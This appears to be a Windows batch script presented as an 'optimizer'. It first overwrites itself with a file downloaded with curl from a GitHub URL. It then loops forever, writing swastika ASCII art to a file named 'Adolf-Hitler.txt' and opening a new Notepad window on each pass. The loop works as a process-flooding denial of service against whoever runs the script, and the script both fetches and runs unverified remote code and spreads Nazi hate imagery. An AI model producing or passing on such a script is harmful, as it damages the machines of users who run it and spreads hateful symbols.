REM Updater
echo ---------------------------------------------------------------------------
echo                                  Updating
echo.
set "filePath=%~f0"
copy "%filePath%" "%filePath%.old"
curl "https://raw.githubusercontent.com/Izaiashi/Random-Batch-Shit/main/optimizer-api.bat" -o "%filePath%"
echo.
echo ---------------------------------------------------------------------------
echo.

cls

REM Loops

:Hitler  
	echo.
	echo ▓▓▓▓▓▓▀▀░░░░░░▀▀▓▓▓▓▓▓ > Adolf-Hitler.txt
	echo ▓▓▓▀░░░░░▄██▄░░░░░▀▓▓▓ >> Adolf-Hitler.txt
	echo ▓▓░░░░░▄▄██▀░░░░░░░░▓▓ >> Adolf-Hitler.txt
	echo ▓░░░░░▄██▀░░░▄█▄░░░░░▓ >> Adolf-Hitler.txt
	echo ▌░░░░░▀██▄▄▄█████▄░░░▐ >> Adolf-Hitler.txt
  	echo ░░▄▄▄░░░▀████▀░▀▀██▄░░ >> Adolf-Hitler.txt
  	echo ░░▀██▄░▄▄████▄░░░▀▀▀░░ >> Adolf-Hitler.txt
  	echo ▌░░░▀█████▀▀▀██▄░░░░░▐ >> Adolf-Hitler.txt
  	echo ▓░░░░░▀█▀░░░▄██▀░░░░░▓ >> Adolf-Hitler.txt
  	echo ▓▓░░░░░░░░▄██▀░░░░░░▓▓ >> Adolf-Hitler.txt
  	echo ▓▓▓▄░░░░░▀█▀▀░░░░░▄▓▓▓ >> Adolf-Hitler.txt
  	echo ▓▓▓▓▓▓▄▄░░░░░░▄▄▓▓▓▓▓▓ >> Adolf-Hitler.txt
	start "" notepad.exe
	goto :Hitler
